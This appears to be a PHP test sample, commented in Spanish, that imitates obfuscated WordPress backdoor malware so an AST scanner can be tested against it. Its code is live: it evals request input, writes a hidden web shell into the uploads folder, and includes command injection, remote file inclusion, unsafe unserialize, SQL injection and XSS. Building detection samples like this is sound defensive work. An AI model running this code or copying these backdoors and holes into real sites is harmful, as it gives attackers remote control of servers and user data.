<?php
/**
 * Ejemplo de malware ofuscado tipo "backdoor" que podría encontrarse en WordPress
 * Este archivo simula código malicioso real para probar el escáner AST
 */

// Ofuscación nivel 1: Variables dinámicas y funciones codificadas
$func_ejecutar = 'e' . 'v' . 'a' . 'l';
$codigo_oculto = base64_decode('ZXZhbCgkX0dFVFsnY21kJ10pOw==');

// Ejecución dinámica - BACKDOOR directa
$func_ejecutar($codigo_oculto);

// Ofuscación nivel 2: Inyección SQL encubierta
function obtener_usuario($id) {
    global $wpdb;
    // SQL Injection clásica pero ofuscada
    $consulta = "SELECT * FROM " . $wpdb->users . " WHERE id = " . $id;
    return $wpdb->get_results($consulta);
}

// Llamada vulnerable desde GET sin sanitizar
if (isset($_GET['uid'])) {
    $datos = obtener_usuario($_GET['uid']);
}

// Ofuscación nivel 3: XSS Almacenado
function mostrar_comentario($texto) {
    // XSS directo - sin escaping
    echo '<div class="comentario">' . $texto . '</div>';
}

// Recibe datos sin limpiar y los muestra
if (isset($_POST['comentario'])) {
    mostrar_comentario($_POST['comentario']);
}

// Ofuscación nivel 4: Inclusión remota de archivos (RFI)
$ruta_archivo = $_REQUEST['file'];
if (!empty($ruta_archivo)) {
    include($ruta_archivo); // RFI directo
}

// Ofuscación nivel 5: Serialización insegura
if (isset($_COOKIE['datos_usuario'])) {
    $usuario = unserialize($_COOKIE['datos_usuario']);
    // Posible ejecución de código arbitrario mediante __wakeup()
}

// Ofuscación nivel 6: Command Injection
if (isset($_GET['ping'])) {
    $host = $_GET['ping'];
    system("ping -c 1 " . $host); // Ejecución de comandos OS
}

// Ofuscación nivel 7: Creación de archivo backdoor
$archivo_oculto = fopen(ABSPATH . '/wp-content/uploads/.backdoor.php', 'w');
fwrite($archivo_oculto, '<?php eval($_POST["cmd"]); ?>');
fclose($archivo_oculto);

// Ofuscación nivel 8: Uso de create_function (deprecated pero peligroso)
$funcion_dinamica = create_function('$a', 'return system($a);');
$funcion_dinamica($_GET['cmd']);

// Ofuscación nivel 9: Callbacks peligrosos
array_map($_GET['func'], $_POST['args']); // Ejecución vía callback
call_user_func($_REQUEST['callback'], $_GET['param']);

// Ofuscación nivel 10: Base64 + GZInflate combinados
$carga_util = gzinflate(base64_decode('eJwrSi0oUchNzE0tLgIA'));
eval($carga_util);

echo "Escaneo completado - Archivo malicioso simulado";
